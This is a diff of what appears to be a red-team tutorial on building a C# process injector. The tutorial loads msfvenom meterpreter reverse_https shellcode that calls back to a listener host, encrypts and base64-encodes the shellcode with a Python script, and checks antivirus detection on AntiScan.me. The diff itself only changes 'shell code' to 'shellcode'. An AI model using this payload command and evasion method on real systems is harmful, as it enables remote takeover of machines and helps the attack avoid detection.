@@ -24,7 +24,7 @@ static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byt
 static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 ```
 
-The shell code was created with msfvenom and sits inside the main function in the buf byte array.
+The shellcode was created with msfvenom and sits inside the main function in the buf byte array.
 ```csharp
 // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.33 LPORT=443 EXITFUNC=thread -f csharp
 byte[] buf = new byte[685] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
@@ -55,7 +55,7 @@ We build this C# code and upload it to [AntiScan.me](https://antiscan.me/). The 
 
 The Python code will take one argument. The argument determines the encryption type to be used (We can then add different encryption types later). The script will then run a hard coded msfvenom command, via python subprocess. The output from the msfvenom command is then encrypted via the chosen encryption type. The last function in the script will encode the encrypted bytes into a base64 string, ready to be used with the previous C# Process Injection application.
 
-## Getting Our Msfvenom Shell Code 
+## Getting Our Msfvenom Shellcode 
 
 The first function, will simply run a command and save the output to a variable named 'output', the variable will be returned and assigned to the data variable (Start of the script calls shell_format(). 
 
@@ -79,7 +79,7 @@ Below is the output from the msfvenom command, when run in the Linux terminal. T
 
 ![msf](msf-hex.png)
 
-## Encrypting The Shell Code
+## Encrypting The Shellcode
 
 With our returned hex shell code (output.stdout), we will call the function 'aes_encrypt_shellcode(data)' and pass the msfvenom command as data. The following function will assemble the pieces needed to encrypt our data variable.
 
@@ -145,7 +145,7 @@ Running the script we get our msfvenom, generated shellcode,  the IV ([Initializ
 
 ![encoded](script-output.png)
 
-## Decoding The Encrypted Shell Code In Our C# Process Injector
+## Decoding The Encrypted Shellcode In Our C# Process Injector
 
 We will now add a few changes to the the C# code. First, we add string variables for our base64 strings. We then convert the base64 strings into byte arrays, with Convert.FromBase64String().
 
